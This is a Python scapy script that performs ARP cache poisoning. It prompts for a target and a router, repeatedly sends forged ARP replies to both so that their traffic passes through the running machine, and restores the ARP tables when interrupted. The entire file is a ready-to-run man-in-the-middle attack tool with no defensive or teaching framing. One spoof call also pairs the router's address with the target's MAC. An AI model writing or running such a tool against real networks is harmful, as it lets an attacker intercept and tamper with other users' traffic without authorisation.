import scapy.all as s
import time
import sys

def get_mac(ip):
	arpr = s.ARP(pdst=ip)
	broadcast = s.Ether(dst="ff:ff:ff:ff:ff:ff")
	arprb = broadcast/arpr
	a = s.srp(arprb, timeout=1, verbose=False)[0]

	return a[0][1].hwsrc

def spoof(t, hw, r):
	packet = s.ARP(op=2,pdst=f'{t}',hwdst=f'{hw}',psrc=f'{r}')
	s.send(packet, verbose=False)

def restore(t, r):
	hwt = get_mac(t)
	hwr = get_mac(r)
	packet = s.ARP(op=2,pdst=f'{t}',hwdst=f'{hwt}',psrc=f'{r}', hwsrc=f'{hwr}')
	s.send(packet, verbose=False, count=False)

def main():
	t = input("Target: ")
	r = input("Router: ")
	hw = get_mac(t)
	
	pcount = 0
	try:
		while True:
			spoof(t, hw, r)
			pcount += 1
			spoof(r, hw, t)
			pcount += 1
			print(f"\r[+] Packets sent: {pcount}", end="", flush=True) # dynamic printing
			time.sleep(2)
	except KeyboardInterrupt:
		restore(t, r)
		restore(r, t)
		print("\n[+] Bye...")

if __name__ == '__main__':
	try:
		main()
	except Exception as e:
		print(f"Err: {e}")